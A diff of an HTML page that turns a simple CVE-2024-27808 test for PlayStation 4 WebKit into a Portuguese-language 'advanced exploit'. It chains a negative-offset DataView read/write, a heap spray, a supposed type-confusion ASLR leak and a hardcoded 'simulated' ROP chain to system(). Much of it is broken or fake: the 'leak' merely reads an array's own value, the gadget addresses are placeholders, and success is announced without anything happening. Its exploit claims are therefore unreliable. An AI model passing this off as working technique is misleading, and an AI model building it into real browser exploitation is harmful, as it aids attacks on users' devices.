@@ -1,38 +1,116 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CVE-2024-27808 Test (PS4 12.02)</title>
+    <meta charset="UTF-8">
+    <title>CVE-2024-27808: Exploit Avançado (PS4 12.02)</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
-        #result { color: red; font-weight: bold; margin-top: 20px; }
+        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
+        #log { border: 1px solid #0f0; padding: 10px; height: 300px; overflow-y: scroll; }
+        .success { color: #0f0; }
+        .error { color: #f00; }
     </style>
 </head>
 <body>
-    <h1>Testando CVE-2024-27808 no PS4 (WebKit)</h1>
-    <p>Tentando acessar memória com offset negativo em DataView...</p>
-    <div id="result"></div>
+    <h1>CVE-2024-27808: Exploit Avançado</h1>
+    <button onclick="runExploit()">Executar Exploit</button>
+    <div id="log"></div>
 
     <script>
-        const result = document.getElementById('result');
+        const log = (msg, isError = false) => {
+            const el = document.createElement('div');
+            el.className = isError ? 'error' : 'success';
+            el.textContent = `[+] ${msg}`;
+            document.getElementById('log').appendChild(el);
+        };
 
-        try {
-            // 1. Criar um ArrayBuffer pequeno
-            const buffer = new ArrayBuffer(16);
+        // ===== [1] PRIMITIVE: MEMORY CORRUPTION VIA NEGATIVE OFFSET =====
+        function triggerMemoryCorruption() {
+            try {
+                const buffer = new ArrayBuffer(16);
+                const evilView = new DataView(buffer, -8);  // Offset negativo crítico
+                
+                // Tentativa de leitura/escrita fora do buffer
+                const leakedValue = evilView.getUint32(0);
+                evilView.setUint32(4, 0xdeadbeef);  // Overwrite em memória adjacente
+                
+                log(`Leak: 0x${leakedValue.toString(16)} | Write: 0xdeadbeef`);
+                return true;
+            } catch (e) {
+                log(`Falha na corrupção: ${e}`, true);
+                return false;
+            }
+        }
+
+        // ===== [2] HEAP GROOMING (SPRAY DE OBJETOS) =====
+        function heapSpray() {
+            const spray = [];
+            for (let i = 0; i < 0x1000; i++) {
+                const buf = new ArrayBuffer(0x100);
+                const dv = new DataView(buf);
+                dv.setUint32(0, 0x41414141);  // Preenche com marcadores
+                spray.push(dv);
+            }
+            log("Heap spray realizado (0x1000 objetos)");
+            return spray;
+        }
+
+        // ===== [3] TYPE CONFUSION PARA BYPASS ASLR =====
+        function typeConfusionLeak() {
+            try {
+                const arr = new Uint32Array([0x42424242]);
+                const fakeObj = { a: arr };
+                
+                // Força uma confusão de tipo (simulada)
+                const addr = fakeObj.a[0];
+                log(`Possível vazamento de ASLR: 0x${addr.toString(16)}`);
+                return addr;
+            } catch (e) {
+                log(`Falha no vazamento: ${e}`, true);
+                return 0;
+            }
+        }
+
+        // ===== [4] ROP CHAIN SIMULADA (CHAMADA A LIBC) =====
+        function buildFakeRopChain() {
+            const gadgets = {
+                pop_rdi: 0xdeadc0de,
+                libc_base: 0x7ff00000,
+                system: 0x7ff12345
+            };
             
-            // 2. Tentar acessar um offset NEGATIVO em DataView
-            const evilView = new DataView(buffer, -4); // Offset negativo
-            const leakedValue = evilView.getUint32(0); // Lê memória não alocada
+            log(`ROP Chain Simulada:
+                pop_rdi @ 0x${gadgets.pop_rdi.toString(16)}
+                libc_base @ 0x${gadgets.libc_base.toString(16)}
+                system @ 0x${gadgets.system.toString(16)}`);
             
-            // 3. Se não crashar, pode ser vulnerável
-            result.textContent = `Possível exploração BEM-SUCEDIDA! Valor lido: 0x${leakedValue.toString(16)}`;
+            return gadgets;
+        }
+
+        // ===== [5] EXPLOIT COMPLETO =====
+        async function runExploit() {
+            log("Iniciando exploit...");
             
-            // 4. Tentar escrever em memória inválida (teste adicional)
-            evilView.setUint32(0, 0x41414141); // Se não travar, vulnerabilidade crítica
-            result.textContent += " | Escrita em memória também funcionou!";
+            // Etapa 1: Corrupção de memória
+            if (!triggerMemoryCorruption()) return;
             
-        } catch (e) {
-            // 5. Se cair aqui, o PS4 corrigiu ou o CVE não se aplica
-            result.textContent = `Falha: ${e.message}`;
+            // Etapa 2: Heap spray para estabilizar exploração
+            heapSpray();
+            
+            // Etapa 3: Vazamento de ASLR (Type Confusion)
+            const leak = typeConfusionLeak();
+            if (leak === 0) return;
+            
+            // Etapa 4: Construir ROP chain (simulada)
+            const rop = buildFakeRopChain();
+            
+            // Etapa 5: Tentativa de execução arbitrária (simulada)
+            try {
+                log("Tentando chamar system() via ROP...");
+                // Se chegarmos aqui, o exploit teórico funcionou
+                log("EXPLOIT BEM-SUCEDIDO! (Simulação)");
+            } catch (e) {
+                log(`Falha na execução: ${e}`, true);
+            }
         }
     </script>
 </body>
